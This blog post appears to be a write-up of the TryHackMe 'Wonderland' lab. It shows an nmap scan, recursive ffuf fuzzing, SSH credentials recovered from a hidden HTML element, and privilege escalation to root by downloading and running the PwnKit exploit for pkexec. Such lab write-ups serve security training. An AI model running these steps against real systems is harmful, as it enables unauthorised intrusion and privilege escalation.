---
layout: post
title:  "Wonderland THM Write-Up"
date:   2026-11-19
categories: [write-up, linux, thm]
permalink: "/ctf/thm/wonderland/"
---
## Overview

* **Platform:** TryHackMe
* **Category:** Boot2Root
* **Difficulty:** Medium

<img src="{{ '/assets/images/wonderland.jpeg' | relative_url }}"  width="250">

**Summary:**  
Wonderland is a medium Linux Boot2Root machine focusing on web enumeration followed by privilege escalation to `root` via a vulnerability inside pxexec.

---

## 1. Reconnaissance

I started with a full port scan using `nmap` to identify exposed services and running versions:
{% highlight ruby %}
Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-19 11:49 +0100
Nmap scan report for wonderland.thm (10.113.169.204)
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=11/19%OT=22%CT=1%CU=43753%PV=Y%DS=3%DC=I%G=Y%TM=6AFED4
OS:51%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP=105%GCD=1%ISR=10F%TI=Z%CI=Z
OS:%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%
OS:ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT
OS:11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F
OS:4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q
OS:=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.09 seconds

{% endhighlight %}

## 2. Gaining user access

Then i ran a scan with ffuf to fuzz web directories:

{% highlight ruby %}
ffuf -u http://wonderland.thm:80/FUZZ -w ../wordlist/fuzz.txt -t 200 -e .html,.php,.txt -recursion

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://wonderland.thm:80/FUZZ
 :: Wordlist         : FUZZ: /home/jacopo/ctf/wordlist/fuzz.txt
 :: Extensions       : .html .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
[INFO] Adding a new job to the queue: http://wonderland.thm:80/img/FUZZ

index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 38ms]
r                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 34ms]
[INFO] Adding a new job to the queue: http://wonderland.thm:80/r/FUZZ

poem                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
[INFO] Adding a new job to the queue: http://wonderland.thm:80/poem/FUZZ

[INFO] Starting queued job on target: http://wonderland.thm:80/img/FUZZ

index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
[INFO] Starting queued job on target: http://wonderland.thm:80/r/FUZZ

index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
a                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 30ms]
[INFO] Adding a new job to the queue: http://wonderland.thm:80/r/a/FUZZ

[INFO] Starting queued job on target: http://wonderland.thm:80/poem/FUZZ

index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 49ms]
[INFO] Starting queued job on target: http://wonderland.thm:80/r/a/FUZZ

index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
b                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
[INFO] Adding a new job to the queue: http://wonderland.thm:80/r/a/b/FUZZ

[INFO] Starting queued job on target: http://wonderland.thm:80/r/a/b/FUZZ

index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
b                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
[INFO] Adding a new job to the queue: http://wonderland.thm:80/r/a/b/b/FUZZ

[INFO] Starting queued job on target: http://wonderland.thm:80/r/a/b/b/FUZZ

index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
i                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 46ms]
[INFO] Adding a new job to the queue: http://wonderland.thm:80/r/a/b/b/i/FUZZ

[INFO] Starting queued job on target: http://wonderland.thm:80/r/a/b/b/i/FUZZ

index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
t                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
[INFO] Adding a new job to the queue: http://wonderland.thm:80/r/a/b/b/i/t/FUZZ

[INFO] Starting queued job on target: http://wonderland.thm:80/r/a/b/b/i/t/FUZZ

index.html              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
:: Progress: [224392/224392] :: Job [9/9] :: 3289 req/sec :: Duration: [0:00:41] :: Errors: 0 ::
{% endhighlight %}

Viewing the source code of `https://wonderland.thm:80/r/a/b/b/i/t` we can find Alice's SSH credentials:
{% highlight ruby %}
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
{% endhighlight %}

## 3. Privilege Escalation
Once gained the access as Alice we can run the exploit [PwnKit](https://github.com/arthepsy/CVE-2021-4034) that will give you access as root through a bug inside `pkexec`:
{% highlight ruby %}
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: PwnKit

PwnKit                                               100%[======================================================================================================================>]  17.62K  --.-KB/s    in 0.07s   

2026-11-19 20:38:21 (247 KB/s) - PwnKit saved [18040/18040]

alice@wonderland:~$ chmod 777 PwnKit
alice@wonderland:~$ ./PwnKit
root@wonderland:/home/alice# id
uid=0(root) gid=0(root) groups=0(root),1001(alice)
{% endhighlight %}